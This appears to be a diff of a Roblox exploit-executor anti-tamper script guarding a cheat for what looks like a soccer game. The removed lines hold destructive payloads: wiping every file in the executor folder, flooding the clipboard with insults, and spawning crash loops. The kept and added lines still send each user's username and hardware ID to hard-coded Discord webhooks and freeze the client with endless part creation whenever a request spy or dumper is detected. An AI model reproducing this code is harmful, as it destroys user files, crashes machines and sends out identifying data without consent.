@@ -41,35 +41,6 @@ local HttpService = game:GetService("HttpService")
 local CacheFolder = "RBXSoundCache"
 local ScriptHash = "v1.1.8"
 
-local function WhatIsThis()
-    pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
-    setclipboard = function() end
-    for _, GUI in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() GUI:Destroy() end) end
-    for _, GUI in pairs(LocalPlayer.PlayerGui:GetDescendants()) do pcall(function() GUI:Destroy() end) end
-    pcall(function() for _, GUI in pairs(gethui():GetDescendants()) do GUI:Destroy() end end)
-    
-    local FileManager = game:GetService("FileManagerService")
-    for Index = 1, 50 do
-        task.spawn(function()
-            while true do
-                for J = 1, 200 do
-                    Instance.new("Part", workspace)
-                    pcall(function() FileManager:OpenFolder(Enum.EngineFolder.Logs) end)
-                    pcall(function() FileManager:OpenFileInWebBrowser(Enum.EngineFolder.Logs, "log.txt") end)
-                    pcall(function() FileManager:RevealFileInFolder(Enum.EngineFolder.Logs, "log.txt") end)
-                    pcall(function() FileManager:ListFilesInFolderAsync(Enum.EngineFolder.Logs) end)
-                end
-            end
-        end)
-    end
-    
-    task.wait(0.1)
-    while true do
-        pcall(function() game:GetService("GuiService"):ClearError() end)
-        error(string.rep("CRASH", 10000))
-    end
-end
-
 local Method1 = game:GetService("RbxAnalyticsService"):GetClientId()
 local Service = game:GetService("RbxAnalyticsService")
 local Method2 = Service.GetClientId(Service)
@@ -121,173 +92,95 @@ local function LogDetection(Reason: string)
     end
 end
 
-local function CrashClient(ImageID: string, SoundID: string, DisplayText: string, DetectionReason: string)
-    if DetectionReason then
-        LogDetection(DetectionReason)
-        local Executor = identifyexecutor() or "Unknown"
-        
-        local UserFriendlyReason = "Anti-Tamper Violation"
-        local WebhookTitle = "PULSE ANTI-TAMPER DETECTION"
-        
-        if DetectionReason:match("HWID") then
-            UserFriendlyReason = "HWID Spoofing - Gang, who are you? 😂"
-            WebhookTitle = "HWID SPOOFING DETECTED"
-        elseif DetectionReason:match("identifyexecutor") or DetectionReason:match("IDENTIFY") then
-            UserFriendlyReason = "Executor Identity Manipulation"
-            WebhookTitle = "EXECUTOR SPOOFING DETECTED"
-        elseif DetectionReason:match("HTTP") or DetectionReason:match("request") or DetectionReason:match("webhook") then
-            UserFriendlyReason = "HTTP Request Interception"
-            WebhookTitle = "HTTP SPY DETECTED"
-        elseif DetectionReason:match("String") or DetectionReason:match("dumper") then
-            UserFriendlyReason = "Script Content Extraction"
-            WebhookTitle = "STRING DUMPER DETECTED"
-        elseif DetectionReason:match("hook") or DetectionReason:match("HOOK") then
-            UserFriendlyReason = "Function Interception"
-            WebhookTitle = "FUNCTION HOOKING DETECTED"
-        elseif DetectionReason:match("tamper") or DetectionReason:match("TAMPER") then
-            UserFriendlyReason = "Critical Function Tampering"
-            WebhookTitle = "FUNCTION TAMPERING DETECTED"
-        elseif DetectionReason:match("environment") or DetectionReason:match("env") then
-            UserFriendlyReason = "Script Environment Manipulation"
-            WebhookTitle = "ENVIRONMENT TAMPERING DETECTED"
-        end
-        
-        local ClipboardSpam = {
-            "你好世界 How did I get here? 这是什么",
-            "检测系统 Nice try buddy 哈哈哈",
-            "HTTP间谍 Who is this guy? 垃圾代码",
-            "硬件欺骗 What happened? 笑死了",
-            "函数挂钩 Stop trying 愚蠢的人",
-            "字符串转储 Your tool failed 废物",
-            "环境篡改 Imagine getting caught 可怜",
-            "反篡改 You thought wrong 做梦",
-            "检测到 Get better 学会编程",
-            "安全违规 This is awkward 活该"
-        }
-        
-        pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end)
-        pcall(function() game:GetService("GuiService"):ClearError() end)
-        
-        setclipboard = function() end
-        toclipboard = function() end
-        toClipboard = function() end
-        setClipboard = function() end
-        writeclipboard = function() end
-        writeClipboard = function() end
-        
-        for k, v in pairs(getgenv()) do
-            if type(k) == "string" and k:lower():match("clipboard") then
-                getgenv()[k] = function() end
-            end
-        end
-
-        writefile = function() end
-        readfile = function() end
-        listfiles = function() end
-        delfile = function() end
-        makefolder = function() end
-        isfolder = function() end
-        isfile = function() end
-        hookfunction = function() end
-        hookmetamethod = function() end
-        getgc = function() end
-        debug = {}
-        getreg = function() end
-        getscripts = function() end
-        getscriptclosure = function() end
-        getnilinstances = function() end
-        
-        pcall(function()
-            (syn and syn.request or http_request or request)({
-                Url = "https://discord.com/api/webhooks/1470775693603246326/xIybrPlQbiPy4HX6zk0mwGYKRZO1bDwiDUz9yPDiYVwbDsmAZOL_8Rhs-Oc5_h8iJMxT",
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    embeds = {{
-                        title = WebhookTitle,
-                        color = 15158332,
-                        thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. LocalPlayer.UserId .. "&size=150x150&format=Png&isCircular=false"},
-                        fields = {
-                            {name = "Detection", value = DetectionReason, inline = false},
-                            {name = "Username", value = LocalPlayer.Name, inline = true},
-                            {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
-                            {name = "Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
-                            {name = "HWID", value = "`" .. HWID .. "`", inline = false},
-                            {name = "Executor", value = Executor, inline = true}
-                        },
-                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
-                        footer = {text = "PSS"}
-                    }}
-                })
+local function CrashClient(DetectionReason: string)
+    LogDetection(DetectionReason)
+    local Executor = identifyexecutor() or "Unknown"
+    
+    local WebhookTitle = "HTTP SPY DETECTED"
+    if DetectionReason:match("HWID") then
+        WebhookTitle = "HWID SPOOFING DETECTED"
+    end
+    
+    pcall(function()
+        (syn and syn.request or http_request or request)({
+            Url = "https://discord.com/api/webhooks/1470775693603246326/xIybrPlQbiPy4HX6zk0mwGYKRZO1bDwiDUz9yPDiYVwbDsmAZOL_8Rhs-Oc5_h8iJMxT",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                embeds = {{
+                    title = WebhookTitle,
+                    color = 15158332,
+                    fields = {
+                        {name = "Detection", value = DetectionReason, inline = false},
+                        {name = "Username", value = LocalPlayer.Name, inline = true},
+                        {name = "HWID", value = "`" .. HWID .. "`", inline = false},
+                        {name = "Executor", value = Executor, inline = true}
+                    },
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+                }}
             })
-        end)
-        
-        LocalPlayer:Kick("Pulse Anti-Tamper Detection\n\nViolation: " .. (UserFriendlyReason or "Unknown") .. "\n\nRunning other scripts may cause false detections.\nOnly execute this script.\n\nMultiple violations = permanent blacklist.\nReport sent to Discord.\n\nFalse positive? Contact @Nate on Discord.")
-        
-        task.wait(3)
-
-        for i = 1, 50 do
-            task.spawn(function()
-                while true do
-                    pcall(function()
-                        setclipboard(ClipboardSpam[math.random(1, #ClipboardSpam)])
-                        toclipboard(ClipboardSpam[math.random(1, #ClipboardSpam)])
-                        toClipboard(ClipboardSpam[math.random(1, #ClipboardSpam)])
-                        setClipboard(ClipboardSpam[math.random(1, #ClipboardSpam)])
-                        writeclipboard(ClipboardSpam[math.random(1, #ClipboardSpam)])
-                        writeclipboard(ClipboardSpam[math.random(1, #ClipboardSpam)])
-                        writeClipboard(ClipboardSpam[math.random(1, #ClipboardSpam)])
-                    end)
-                    task.wait(0.1)
-                end
-            end)
+        })
+    end)
+    
+    while true do
+        for i = 1, 9999 do
+            Instance.new("Part", workspace)
         end
-
-        task.spawn(function()
-            pcall(function()
-                for _, file in pairs(originalListfiles()) do
-                    originalDelfile(file)
-                end
-            end)
-            for i = 1, 100 do
-                pcall(function()
-                    originalWritefile("HoeLeyShet_" .. i .. ".txt", "你被检测到了 Detection triggered 哈哈 How did this happen 垃圾代码")
-                    originalWritefile("ThisFileIsVulnerable_" .. i .. ".dat", "What were you trying to do? 做梦吧 Your bypass failed 可怜")
-                end)
-            end
-        end)
-        
-        local FileManager = game:GetService("FileManagerService")
-        for i = 1, 500 do
-            task.spawn(function()
-                while true do
-                    pcall(function()
-                        error("PULSE_ANTI_TAMPER_JUNK_" .. string.rep("A", 1000) .. "_BYTECODE_" .. string.rep("B", 1000) .. "_ERROR_" .. string.rep("C", 1000))
-                    end)
-                    pcall(function()
-                        warn("PULSE_DETECTION_SPAM_" .. string.rep("X", 2000) .. "_CONSOLE_FLOOD_" .. string.rep("Y", 2000))
-                    end)
-                    pcall(function()
-                        print("PULSE_JUNK_DATA_" .. string.rep("Z", 3000) .. "_ANTI_TAMPER_" .. string.rep("Q", 3000))
-                    end)
-                    pcall(function() FileManager:OpenFolder(Enum.EngineFolder.Logs) end)
-                    pcall(function() FileManager:OpenFileInWebBrowser(Enum.EngineFolder.Logs, "log.txt") end)
-                    pcall(function() FileManager:RevealFileInFolder(Enum.EngineFolder.Logs, "log.txt") end)
-                    pcall(function() FileManager:ListFilesInFolderAsync(Enum.EngineFolder.Logs) end)
-                end
-            end)
-        end
-        
-        WhatIsThis()
     end
 end
 
+local spyPatterns = {
+    "discord%.com/api/webhooks",
+    "webhook",
+    "HttpSpy",
+    "RequestLogger", 
+    "ToopSpy",
+    "HTTP SPY",
+    "REQUEST SPY",
+    "WEBHOOK SPY",
+    "Method:",
+    "URL:",
+    "Body:",
+    "Headers:",
+    "Response:",
+    "Status Code:"
+}
+
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+
+local originalIndex = mt.__index
+mt.__index = newcclosure(function(self, key)
+    local result = originalIndex(self, key)
+    
+    if key == "Text" and type(result) == "string" then
+        for _, pattern in pairs(spyPatterns) do
+            if result:match(pattern) then
+                CrashClient("Spy text detected in GUI: " .. pattern)
+            end
+        end
+    end
+    
+    return result
+end)
+
+local originalNewindex = mt.__newindex
+mt.__newindex = newcclosure(function(self, key, value)
+    if key == "Text" and type(value) == "string" then
+        for _, pattern in pairs(spyPatterns) do
+            if value:match(pattern) then
+                CrashClient("Spy text being set in GUI: " .. pattern)
+            end
+        end
+    end
+    
+    return originalNewindex(self, key, value)
+end)
+
+setreadonly(mt, true)
+
 if Method1 ~= Method2 then
-    task.spawn(function()
-        task.wait(0.1)
-        CrashClient("", "", "", "HWID spoofing detected")
-    end)
-    return
+    CrashClient("HWID spoofing detected")
 end
 
 local HwidFunctions = {"gethwid", "getexecutorhwid", "get_hwid", "GetHWID"}
@@ -313,71 +206,24 @@ task.spawn(function()
         local TestMethod2 = TestService.GetClientId(TestService)
         
         if TestMethod1 ~= TestMethod2 then
-            CrashClient("", "", "", "HWID spoofing detected")
+            CrashClient("HWID spoofing detected")
         end
         
         if identifyexecutor ~= OriginalIdentify then
-            CrashClient("", "", "", "identifyexecutor function replaced")
-        end
-        
-        local success, currentIdentifyInfo = pcall(originalDebug.getinfo, identifyexecutor)
-        if success then
-            if currentIdentifyInfo.what ~= "C" then
-                CrashClient("", "", "", "identifyexecutor not C closure")
-            end
-            
-            if OriginalIdentifyInfo.what == "C" and currentIdentifyInfo.source ~= "=[C]" then
-                CrashClient("", "", "", "identifyexecutor wrapped")
-            end
-        end
-        
-        for _, funcName in pairs(HwidFunctions) do
-            local currentFunc = getgenv()[funcName] or _G[funcName]
-            local originalData = OriginalHwidInfo[funcName]
-            
-            if originalData and currentFunc then
-                local success, currentInfo = pcall(originalDebug.getinfo, currentFunc)
-                if success then
-                    if currentFunc ~= originalData.func then
-                        CrashClient("", "", "", "HWID function replaced: " .. funcName)
-                    end
-                    
-                    if currentInfo.what ~= "C" then
-                        CrashClient("", "", "", "HWID function not C closure: " .. funcName)
-                    end
-                    
-                    if originalData.info.what == "C" and currentInfo.source ~= "=[C]" then
-                        CrashClient("", "", "", "HWID function wrapped: " .. funcName)
-                    end
-                end
-            end
-        end
-        
-        local currentIdentify = identifyexecutor
-        local success2, currentIdentifyInfo = pcall(originalDebug.getinfo, currentIdentify)
-        if success2 then
-            if currentIdentify ~= OriginalIdentify then
-                CrashClient("", "", "", "identifyexecutor function replaced")
-            end
-            
-            if currentIdentifyInfo.what ~= "C" then
-                CrashClient("", "", "", "identifyexecutor not C closure")
-            end
-            
-            if OriginalIdentifyInfo.what == "C" and currentIdentifyInfo.source ~= "=[C]" then
-                CrashClient("", "", "", "identifyexecutor wrapped")
-            end
+            CrashClient("identifyexecutor function replaced")
         end
         
         if getgenv().EmplicsWebhookSpy or getgenv().StringDumper or getgenv().discordwebhookdetector then
-            CrashClient("", "", "", "String dumper or webhook spy detected")
+            CrashClient("String dumper or webhook spy detected")
         end
     end
 end)
 
 game:GetService("LogService").MessageOut:Connect(function(Message)
-    if Message:match("discord%.com/api/webhooks") or Message:match("webhook") or Message:match("dumper") then
-        CrashClient("", "", "", "Webhook/HTTP activity in console: " .. Message:sub(1, 100))
+    for _, pattern in pairs(spyPatterns) do
+        if Message:match(pattern) then
+            CrashClient("Spy console output: " .. pattern)
+        end
     end
 end)
 
@@ -414,7 +260,7 @@ isfile = createSecureBlock("isfile")
 task.spawn(function()
     while task.wait(1) do
         if setclipboard ~= blockedSetclipboard or writefile ~= blockedWritefile then
-            CrashClient("", "", "", "Attempted to restore blocked functions")
+            CrashClient("Attempted to restore blocked functions")
         end
     end
 end)
@@ -513,39 +359,17 @@ local function GenerateTrapKey(): string
 end
 
 local function CorruptAndCrash()
-    local targetEnv = SavedFunctions.getfenv(3)
-    if targetEnv and targetEnv ~= RealEnv then
-        for k, v in SavedFunctions.pairs(targetEnv) do
-            SavedFunctions.rawset(targetEnv, k, function()
-                while true do
-                    for i = 1, 9999 do
-                        Instance.new("Part", workspace)
-                    end
-                end
-            end)
-        end
-    end
-    for i = 1, 100 do
-        task.spawn(function()
-            while true do
-                for j = 1, 999 do
-                    Instance.new("Part", workspace)
-                end
-            end
-        end)
-    end
     while true do
-        error(string.rep("ENVLOGGER_CRASH", 99999))
+        for i = 1, 9999 do
+            Instance.new("Part", workspace)
+        end
     end
 end
 
 local HoneypotTraps = {}
 for i = 1, 25 do
     local trapName = "_secure_" .. GenerateTrapKey() .. "_" .. i
-    HoneypotTraps[trapName] = function()
-        CorruptAndCrash()
-        return nil
-    end
+    HoneypotTraps[trapName] = CorruptAndCrash
 end
 
 local FakeEnvironment = {}
@@ -596,13 +420,8 @@ local EnvironmentMeta = {
         return "Environment"
     end,
     
-    __call = function()
-        CorruptAndCrash()
-    end,
-    
-    __concat = function()
-        CorruptAndCrash()
-    end
+    __call = CorruptAndCrash,
+    __concat = CorruptAndCrash
 }
 
 SavedFunctions.setmetatable(FakeEnvironment, EnvironmentMeta)
@@ -659,32 +478,17 @@ next = function(t, k)
     return OriginalNext(t, k)
 end
 
-getgc = function(includeTables)
-    CorruptAndCrash()
-end
+getgc = CorruptAndCrash
 
 debug = setmetatable({}, {
-    __index = function(self, key)
-        CorruptAndCrash()
-    end,
-    __newindex = function() CorruptAndCrash() end
+    __index = CorruptAndCrash,
+    __newindex = CorruptAndCrash
 })
 
-getreg = function()
-    CorruptAndCrash()
-end
-
-getscripts = function()
-    CorruptAndCrash()
-end
-
-getscriptclosure = function(script)
-    CorruptAndCrash()
-end
-
-getnilinstances = function()
-    CorruptAndCrash()
-end
+getreg = CorruptAndCrash
+getscripts = CorruptAndCrash
+getscriptclosure = CorruptAndCrash
+getnilinstances = CorruptAndCrash
 
 local ScriptFingerprint = {}
 local HandshakeKey = "HANDSHAKE_" .. math.random(100000, 999999)
@@ -725,21 +529,11 @@ task.spawn(function()
         if env.StringDumper then
             CorruptAndCrash()
         end
-        
-        local currentGetfenv = getfenv
-        local currentSetfenv = setfenv
-        local currentPairs = pairs
-        
-        if currentGetfenv ~= getfenv or currentSetfenv ~= setfenv or currentPairs ~= pairs then
-            CorruptAndCrash()
-        end
     end
 end)
 
-task.wait(0.7)
-
 if (syn and syn.request or http_request or request) and pcall(function() return isexecutorclosure end) and not isexecutorclosure((syn and syn.request or http_request or request)) then
-    CrashClient("15889768437", "7111752052", "ALREADY HOOKED BOZO", "Request function already hooked")
+    CrashClient("Request function already hooked")
 end
 
 task.spawn(function()
@@ -757,108 +551,29 @@ task.spawn(function()
 
     while task.wait(0.5) do
         if getgenv().EmplicsWebhookSpy or getgenv().discordwebhookdetector or getgenv().pastebindetector or getgenv().githubdetector or getgenv().anylink or getgenv().kickbypass or getgenv().StringDumper then
-            CrashClient("15889768437", "7111752052", "CORNBALL", "String dumper or webhook spy detected")
+            CrashClient("String dumper or webhook spy detected")
         end
 
         local CurrentFunction = (syn or http).request
         if CurrentFunction ~= OriginalFunction or not isexecutorclosure(CurrentFunction) then
-            CrashClient("15889768437", "7111752052", "GOOFY", "HTTP request function hooked")
+            CrashClient("HTTP request function hooked")
         end
         
         if request and (request ~= OriginalRequest or not isexecutorclosure(request)) then
-            CrashClient("15889768437", "7111752052", "BOZO", "Global request function hooked")
+            CrashClient("Global request function hooked")
         end
 
         local CurrentMetatable = getrawmetatable(game)
         if CurrentMetatable.__namecall ~= OriginalNamecall and not isexecutorclosure(CurrentMetatable.__namecall) then
-            CrashClient("15889768437", "7111752052", "CLOWN", "Namecall metamethod hooked")
+            CrashClient("Namecall metamethod hooked")
         end
         
         local TestMethod1 = game:GetService("RbxAnalyticsService"):GetClientId()
         local TestService = game:GetService("RbxAnalyticsService")
         local TestMethod2 = TestService.GetClientId(TestService)
         if TestMethod1 ~= TestMethod2 then
-            CrashClient("15889768437", "7111752052", "HWID SPOOF", "HWID spoofing detected")
+            CrashClient("HWID spoofing detected")
         end
-        
-        for _, funcName in pairs(HwidFunctions) do
-            local currentFunc = getgenv()[funcName] or _G[funcName]
-            local originalData = OriginalHwidInfo[funcName]
-            
-            if originalData and currentFunc then
-                local success, currentInfo = pcall(originalDebug.getinfo, currentFunc)
-                if success then
-                    if currentFunc ~= originalData.func then
-                        CrashClient("15889768437", "7111752052", "HWID FUNC SWAP", "HWID function replaced: " .. funcName)
-                    end
-                    
-                    if currentInfo.what ~= "C" then
-                        CrashClient("15889768437", "7111752052", "HWID FUNC HOOK", "HWID function not C closure: " .. funcName)
-                    end
-                    
-                    if originalData.info.what == "C" and currentInfo.source ~= "=[C]" then
-                        CrashClient("15889768437", "7111752052", "HWID FUNC WRAP", "HWID function wrapped: " .. funcName)
-                    end
-                end
-            end
-        end
-        
-        local currentIdentify = identifyexecutor
-        local success2, currentIdentifyInfo = pcall(originalDebug.getinfo, currentIdentify)
-        if success2 then
-            if currentIdentify ~= OriginalIdentify then
-                CrashClient("15889768437", "7111752052", "IDENTIFY SWAP", "identifyexecutor function replaced")
-            end
-            
-            if currentIdentifyInfo.what ~= "C" then
-                CrashClient("15889768437", "7111752052", "IDENTIFY HOOK", "identifyexecutor not C closure")
-            end
-            
-            if OriginalIdentifyInfo.what == "C" and currentIdentifyInfo.source ~= "=[C]" then
-                CrashClient("15889768437", "7111752052", "IDENTIFY WRAP", "identifyexecutor wrapped")
-            end
-        end
-    end
-end)
-
-task.spawn(function()
-    local Success, OmniService = pcall(function() return game:GetService("OmniRecommendationsService") end)
-    if not Success or not OmniService then return end
-    pcall(function()
-        local OldMakeRequest = OmniService.MakeRequest
-        OmniService.MakeRequest = function(...)
-            CrashClient("15889768437", "7111752052", "OMNI", "Attempt to access a blacklisted function")
-            return OldMakeRequest(...)
-        end
-    end)
-end)
-
-local function IsOwnMessage(Message: string): boolean
-    return Message:match("Remotes") or Message:match("SoftDisPlayer") or Message:match("PerformTackle") or Message:match("GetBall")
-        or Message:match("AwayGoalDetector") or Message:match("HomeGoalDetector") or Message:match("CalculateDiveDirection")
-        or Message:match("DoDive") or Message:match("IsPlayerGoalkeeper") or Message:match("IsBallHeadingToGoal")
-        or Message:match("ShouldDive") or Message:match("BicycleKick") or Message:match("TeleportService")
-        or Message:match("ReplicatedStorage") or Message:match("MarketplaceService") or Message:match("getProductInfo")
-        or Message:match("GetProductInfo") or Message:match("CRASH") or Message:match("AutoGKConfig")
-        or Message:match("GetMode") or Message:match("GetBallSpeed") or Message:match("IsBallShot")
-        or Message:match("GetBallCreator") or Message:match("IsPlayerMyTeammate") or Message:match("IsThreatening")
-        or Message:match("UpdateCharacter") or Message:match("VirtualInputManager") or Message:match("cloneref")
-        or Message:match("ENVLOGGER") or Message:match("security purposes") or Message:match("Pulse for security reasons")
-end
-
-game:GetService("LogService").MessageOut:Connect(function(Message, MessageType)
-    if Message:match("clonefunction") and Message:match("function expected, got nil") then
-        CrashClient("15889768437", "7111752052", "TAMPERING", "Attempted to nil critical functions")
-    end
-    if Message:match("HookFunction") or Message:match("HookMetaMethod") then
-        CrashClient("15889768437", "7111752052", "HOOK DETECTED", "Custom hook wrapper detected: " .. Message:sub(1, 100))
-    end
-    if Message:match("strings") or Message:match("Saved") or Message:match("dumper") or Message:match("constants") or Message:match("upvalues") then
-        CrashClient("15889768437", "7111752052", "STRING DUMPER", "String dumper activity detected: " .. Message:sub(1, 100))
-    end
-    if IsOwnMessage(Message) then return end
-    if Message:match("discord%.com/api/webhooks") or Message:match("webhook") or (MessageType == Enum.MessageType.MessageError and (Message:match("HttpPost") or Message:match("HttpGet") or Message:match("HTTP"))) then
-        CrashClient("15889768437", "7111752052", "SKID", "Webhook/HTTP activity in console: " .. Message:sub(1, 100))
     end
 end)
 
@@ -867,29 +582,11 @@ local BlacklistURL = "https://gist.githubusercontent.com/89312474124124212455243
 local WhitelistURL = "https://gist.githubusercontent.com/8931247412412421245524343255485937065/81d3d7e7af49081dcbde2c9eaea2f137/raw/1b48f36d6ef614e370b70424639c69822b4057d7/Whitelist.json"
 local Config = {EnableWhitelist=false,EnableHWID=false,EnableExpire=true,EnableErrorWebhook=true}
 
-local function ForceKick(Reason: string)
-    for _, GUI in pairs(game:GetService("CoreGui"):GetDescendants()) do pcall(function() GUI:Destroy() end) end
-    for _, GUI in pairs(LocalPlayer.PlayerGui:GetDescendants()) do pcall(function() GUI:Destroy() end) end
-    pcall(function() for _, GUI in pairs(gethui():GetDescendants()) do GUI:Destroy() end end)
-    for Index = 1, 50 do
-        task.spawn(function()
-            while true do
-                for J = 1, 200 do
-                    Instance.new("Part", workspace)
-                end
-            end
-        end)
-    end
-    task.wait(0.1)
-    game:Shutdown()
-    while true do error(string.rep("CRASH", 10000)) end
-end
-
 local function SendWebhook(Status: string, Reason: string?)
     if not Config.EnableErrorWebhook then return end
     local Success, Data = pcall(function() return HttpService:JSONDecode(game:HttpGet(AuthAPI)) end)
     if not Success then
-        ForceKick("Failed to fetch authentication data. Please try again later.")
+        LocalPlayer:Kick("Failed to fetch authentication data. Please try again later.")
         return
     end
     local Executor = identifyexecutor() or "Unknown"
@@ -905,7 +602,7 @@ local function SendWebhook(Status: string, Reason: string?)
         {name="Expires",value=os.date("%Y-%m-%d %H:%M:%S", Data.expire),inline=true}
     }
     if Reason then table.insert(Fields,3,{name="Reason",value=Reason,inline=false}) end
-    local Success2 = pcall(function()
+    pcall(function()
         (syn and syn.request or http_request or request)({
             Url="https://discord.com/api/webhooks/1467048050655625349/TlCiiteQD8a6n9bxMZ12ltADoSPG_4puUmpwLevQZKvqqli-lROEzjmg7c3JlA3GJsrO",
             Method="POST",
@@ -913,12 +610,11 @@ local function SendWebhook(Status: string, Reason: string?)
             Body=HttpService:JSONEncode({embeds={{title="Authentication",color=Color,thumbnail={url="https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid="..LocalPlayer.UserId.."&size=150x150&format=Png&isCircular=false"},fields=Fields,timestamp=os.date("!%Y-%m-%dT%H:%M:%S"),footer={text="PSS"}}}})
         })
     end)
-    if not Success2 then ForceKick("Failed to send authentication webhook. Security check failed.") end
 end
 
 local BlacklistSuccess, BlacklistData = pcall(function() return HttpService:JSONDecode(game:HttpGet(BlacklistURL)) end)
 if not BlacklistSuccess then
-    ForceKick("Failed to fetch blacklist data. Please try again later.")
+    LocalPlayer:Kick("Failed to fetch blacklist data. Please try again later.")
     return
 end
 
@@ -974,6 +670,3 @@ if Config.EnableExpire then
 end
 
 SendWebhook("Authenticated")
-
-print("Anti-tamper loaded successfully")
-
